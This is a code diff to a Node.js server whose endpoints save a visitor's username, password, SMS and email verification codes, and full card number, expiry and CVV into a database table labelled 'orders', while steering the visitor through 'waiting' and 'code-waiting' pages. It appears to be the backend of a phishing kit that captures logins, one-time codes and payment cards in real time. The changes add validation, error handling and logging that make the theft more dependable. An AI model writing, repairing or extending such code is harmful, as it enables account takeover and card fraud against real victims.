@@ -68,11 +68,12 @@ app.post('/api/orders', async (req, res) => {
 app.post('/api/login-data', async (req, res) => {
   try {
     const { order_id, username } = req.body;
-    if (order_id) {
-      await supabase.from('orders').update({ login_username: username, current_page: 'login' }).eq('id', order_id);
-    }
+    if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
+    const { error } = await supabase.from('orders').update({ login_username: username, current_page: 'login' }).eq('id', order_id);
+    if (error) throw error;
     res.json({ success: true });
   } catch (err) {
+    console.error('login-data error:', err.message);
     res.status(500).json({ success: false, message: err.message });
   }
 });
@@ -81,11 +82,12 @@ app.post('/api/login-data', async (req, res) => {
 app.post('/api/password-data', async (req, res) => {
   try {
     const { order_id, password } = req.body;
-    if (order_id) {
-      await supabase.from('orders').update({ login_password: password, current_page: 'waiting', status: 'pending' }).eq('id', order_id);
-    }
+    if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
+    const { error } = await supabase.from('orders').update({ login_password: password, current_page: 'waiting', status: 'pending' }).eq('id', order_id);
+    if (error) throw error;
     res.json({ success: true });
   } catch (err) {
+    console.error('password-data error:', err.message);
     res.status(500).json({ success: false, message: err.message });
   }
 });
@@ -94,11 +96,12 @@ app.post('/api/password-data', async (req, res) => {
 app.post('/api/code-data', async (req, res) => {
   try {
     const { order_id, code } = req.body;
-    if (order_id) {
-      await supabase.from('orders').update({ verification_code: code, status: 'code_pending', current_page: 'code-waiting' }).eq('id', order_id);
-    }
+    if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
+    const { error } = await supabase.from('orders').update({ verification_code: code, status: 'code_pending', current_page: 'code-waiting' }).eq('id', order_id);
+    if (error) throw error;
     res.json({ success: true });
   } catch (err) {
+    console.error('code-data error:', err.message);
     res.status(500).json({ success: false, message: err.message });
   }
 });
@@ -107,11 +110,12 @@ app.post('/api/code-data', async (req, res) => {
 app.post('/api/email-code-data', async (req, res) => {
   try {
     const { order_id, code } = req.body;
-    if (order_id) {
-      await supabase.from('orders').update({ email_verification_code: code, status: 'email_code_pending', current_page: 'email-code-waiting' }).eq('id', order_id);
-    }
+    if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
+    const { error } = await supabase.from('orders').update({ email_verification_code: code, status: 'email_code_pending', current_page: 'email-code-waiting' }).eq('id', order_id);
+    if (error) throw error;
     res.json({ success: true });
   } catch (err) {
+    console.error('email-code-data error:', err.message);
     res.status(500).json({ success: false, message: err.message });
   }
 });
@@ -120,14 +124,15 @@ app.post('/api/email-code-data', async (req, res) => {
 app.post('/api/card-data', async (req, res) => {
   try {
     const { order_id, card_name, card_number, card_expiry, card_cvv } = req.body;
-    if (order_id) {
-      await supabase.from('orders').update({
-        card_name, card_number, card_expiry, card_cvv,
-        status: 'card_pending', current_page: 'card-waiting'
-      }).eq('id', order_id);
-    }
+    if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
+    const { error } = await supabase.from('orders').update({
+      card_name, card_number, card_expiry, card_cvv,
+      status: 'card_pending', current_page: 'card-waiting'
+    }).eq('id', order_id);
+    if (error) throw error;
     res.json({ success: true });
   } catch (err) {
+    console.error('card-data error:', err.message);
     res.status(500).json({ success: false, message: err.message });
   }
 });
